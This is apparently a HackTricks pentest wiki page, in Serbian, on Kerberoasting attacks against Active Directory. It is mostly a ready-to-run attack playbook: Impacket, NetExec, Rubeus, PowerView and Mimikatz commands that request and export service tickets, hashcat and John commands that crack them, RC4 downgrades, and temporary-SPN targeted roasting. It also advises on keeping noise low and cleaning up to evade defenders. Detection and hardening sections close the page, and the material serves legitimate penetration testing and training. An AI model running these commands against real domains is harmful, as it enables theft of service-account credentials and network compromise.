# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se fokusira na pribavljanje TGS ticket-a, konkretno onih koji se odnose na servise koji rade pod korisničkim nalozima u Active Directory-ju (AD), izuzimajući računare. Za šifrovanje ovih ticket-a koriste se ključevi izvedeni iz korisničkih lozinki, što omogućava offline cracking kredencijala. Korišćenje korisničkog naloga kao servisa označeno je nepraznim svojstvom ServicePrincipalName (SPN).

Bilo koji autentifikovani korisnik domena može da zatraži TGS ticket-e, tako da nisu potrebne posebne privilegije.<sup>[[4]](#references)[[5]](#references)</sup>

### Ključne tačke

- Ciljaju se TGS ticket-i za servise koji rade pod korisničkim nalozima (tj. nalozima sa podešenim SPN-om; ne računarskim nalozima).
- Ticket-i su šifrovani ključem izvedenim iz lozinke servisnog naloga i mogu se crack-ovati offline.
- Nisu potrebne povišene privilegije; bilo koji autentifikovani nalog može da zatraži TGS ticket-e.

> [!WARNING]
> Većina javno dostupnih alata preferira zahtev za RC4-HMAC (etype 23) service ticket-ima, jer se oni crack-uju brže od AES-a. RC4 TGS hash-evi počinju sa `$krb5tgs$23$*`, AES128 sa `$krb5tgs$17$*`, a AES256 sa `$krb5tgs$18$*`. Međutim, mnoga okruženja prelaze na režim koji koristi samo AES. Nemojte pretpostaviti da je relevantan samo RC4.
> Takođe, izbegavajte „spray-and-pray“ roasting. Rubeus-ov podrazumevani kerberoast može da upita i zatraži ticket-e za sve SPN-ove, što je bučno. Najpre enumerišite i ciljajte zanimljive principal-e.

### Tajne servisnih naloga i cena Kerberos kriptografije

Mnogi servisi i dalje rade pod korisničkim nalozima sa ručno upravljanim lozinkama. KDC šifruje service ticket-e ključevima izvedenim iz tih lozinki i prosleđuje ciphertext bilo kom autentifikovanom principal-u, pa kerberoasting omogućava neograničene offline pokušaje bez lockout-a ili telemetrije sa DC-a. Režim šifrovanja određuje potreban budžet za cracking:

| Režim | Izvođenje ključa | Tip šifrovanja | Približna RTX 5090 propusnost* | Napomene |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 sa 4.096 iteracija i salt-om specifičnim za principal, generisanim iz domena + SPN-a | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 miliona pokušaja/s | Salt onemogućava rainbow tabele, ali i dalje omogućava brzo crack-ovanje kratkih lozinki. |
| RC4 + NT hash | Jedan MD4 lozinke (nesalted NT hash); Kerberos dodaje samo 8-bajtni confounder po ticket-u | etype 23 (`$krb5tgs$23$`) | ~4,18 **milijardi** pokušaja/s | ~1000× brže od AES-a; napadači forsiraju RC4 kad god `msDS-SupportedEncryptionTypes` to dozvoljava. |

*Benchmark-e je objavio Chick3nman, kako je navedeno u [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

RC4 confounder samo randomizuje keystream; ne dodaje dodatni rad po pokušaju. Ako se servisni nalozi ne oslanjaju na nasumične tajne (gMSA/dMSA, mašinske naloge ili stringove kojima se upravlja iz vault-a), brzina kompromitovanja zavisi isključivo od GPU budžeta. Nametanje etype-ova koji koriste samo AES uklanja downgrade od milijardu pokušaja u sekundi, ali slabe ljudske lozinke i dalje podležu PBKDF2.<sup>[[3]](#references)</sup>

### Napad

#### Linux

Praktičan end-to-end primer koji koristi NetExec za zahtev roastable ticket-a i Hashcat za njihovo crack-ovanje dostupan je u referenci [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Višefunkcionalni alati koji uključuju kerberoast provere:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumeriši kerberoastable korisnike
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Tehnika 1: Zatražite TGS i izbacite ga iz memorije
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Automatic tools
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS zahtev generiše Windows Security Event 4769 (Zatražen je Kerberos servisni tiket).

### OPSEC i okruženja samo sa AES

- Namerno zatražite RC4 za naloge bez AES-a:
- Rubeus: `/rc4opsec` koristi tgtdeleg za enumeraciju naloga bez AES-a i zahteva RC4 servisne tikete.
- Rubeus: `/tgtdeleg` sa kerberoast takođe pokreće RC4 zahteve gde je to moguće.<sup>[[6]](#references)</sup>
- Roastujte naloge koji koriste samo AES umesto da neprimetno dođe do neuspeha:
- Rubeus: `/aes` enumeriše naloge sa omogućenim AES-om i zahteva AES servisne tikete (etype 17/18).
- Ako već posedujete TGT (PTT ili iz `.kirbi` fajla), možete koristiti `/ticket:<blob|path>` sa `/spn:<SPN>` ili `/spns:<file>` i preskočiti LDAP.
- Ciljanje, ograničavanje brzine i manje buke:
- Koristite `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtrirajte potencijalno slabe lozinke koristeći `/pwdsetbefore:<MM-dd-yyyy>` (starije lozinke) ili ciljajte privilegovane OU-ove pomoću `/ou:<DN>`.<sup>[[8]](#references)</sup>

Primeri (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Ako kontrolišete nalog ili možete da ga izmenite, možete ga učiniti kerberoastable dodavanjem SPN-a:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Downgrade-ujte nalog da biste omogućili RC4 radi lakšeg crackinga (zahteva privilegije za upis na ciljni objekat):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast putem GenericWrite/GenericAll nad korisnikom (privremeni SPN)

Kada BloodHound prikaže da imate kontrolu nad objektom korisnika (npr. GenericWrite/GenericAll), možete pouzdano izvršiti „targeted-roast“ nad tim konkretnim korisnikom čak i ako trenutno nema SPN-ove:<sup>[[9]](#references)</sup>

- Dodajte privremeni SPN kontrolisanom korisniku kako bi bio pogodan za roastovanje.
- Zatražite TGS-REP šifrovan pomoću RC4 (etype 23) za taj SPN, kako biste olakšali cracking.
- Crackujte `$krb5tgs$23$...` hash pomoću hashcat-a.
- Uklonite SPN da biste smanjili footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatizuje dodavanje SPN-a -> zahtevanje TGS-a (etype 23) -> uklanjanje SPN-a):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crackujte izlaz pomoću hashcat autodetect (mode 13100 za `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Napomene o detekciji: dodavanje/uklanjanje SPN-ova proizvodi promene u direktorijumu (Event ID 5136/4738 na ciljnom korisniku), a TGS zahtev generiše Event ID 4769. Razmotrite throttling i prompt cleanup.

Korisne alate za kerberoast napade možete pronaći ovde: https://github.com/nidem/kerberoast

Ako dobijete ovu grešku na Linuxu: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, uzrok je vremensko odstupanje lokalnog sistema. Sinhronizujte vreme sa DC-om:

- `ntpdate <DC_IP>` (zastarelo na nekim distroima)
- `rdate -n <DC_IP>`

### Kerberoast bez domain naloga (AS-requested STs)

U septembru 2022. godine, Charlie Clark je pokazao da, ako principal ne zahteva pre-authentication, moguće je dobiti service ticket putem posebno kreiranog KRB_AS_REQ zahteva izmenom sname vrednosti u telu zahteva, čime se efektivno dobija service ticket umesto TGT-a. Ovo je slično AS-REP roastingu i ne zahteva validne domain credentials.

Detalje pogledajte u Semperis tekstu „New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Morate navesti listu korisnika jer bez validnih credentials ne možete upitovati LDAP ovom tehnikom.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Povezano

Ako ciljate AS-REP roastable korisnike, pogledajte i:

{{#ref}}
asreproast.md
{{#endref}}

### Detekcija

Kerberoasting može biti prikriven. Pretražite Event ID 4769 sa DC-ova i primenite filtere kako biste smanjili količinu šuma:

- Isključite naziv servisa `krbtgt` i nazive servisa koji se završavaju znakom `$` (računarski nalozi).
- Isključite zahteve sa računarskih naloga (`*$$@*`).
- Uključite samo uspešne zahteve (Failure Code `0x0`).
- Pratite tipove enkripcije: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Nemojte generisati upozorenja samo za `0x17`.

Primer PowerShell triage-a:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatne ideje:

- Uspostavite baseline normalnog SPN korišćenja po hostu/korisniku; generišite alert na velike burstove različitih SPN zahteva sa jednog principala.
- Označite neuobičajeno RC4 korišćenje u AES-ojačanim domenima.

### Ublažavanje / Hardening

- Koristite gMSA/dMSA ili machine accounts za servise. Managed accounts imaju nasumične lozinke duže od 120 karaktera i automatski ih rotiraju, zbog čega je offline cracking nepraktičan.<sup>[[7]](#references)</sup>
- Prisilite AES za service accounts podešavanjem `msDS-SupportedEncryptionTypes` na AES-only (decimal 24 / hex 0x18), a zatim rotirajte lozinku kako bi se AES ključevi izveli.<sup>[[7]](#references)</sup>
- Gde je moguće, onemogućite RC4 u svom okruženju i pratite pokušaje korišćenja RC4. Na DC-ovima možete koristiti vrednost registra `DefaultDomainSupportedEncTypes` da usmerite podrazumevane vrednosti za naloge kojima `msDS-SupportedEncryptionTypes` nije podešen. Temeljno testirajte.
- Uklonite nepotrebne SPN-ove sa user accounts.<sup>[[7]](#references)</sup>
- Koristite duge, nasumične lozinke service accounts (25+ karaktera) ako managed accounts nisu izvodljivi; zabranite uobičajene lozinke i redovno sprovodite audit.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking u praksi](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Low-Tech napadi visokog uticaja zasnovani na legacy Kerberos kriptografiji (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kako napasti Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Zahtevanje RC4-enkriptovanog TGS-a kada je AES omogućen](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft smernice za pomoć pri ublažavanju Kerberoasting-a](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Dokumentacija komande Rubeus kerberoast](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL kredencijali → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Novi attack paths? AS Requested Service Tickets (Charlie Clark, septembar 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
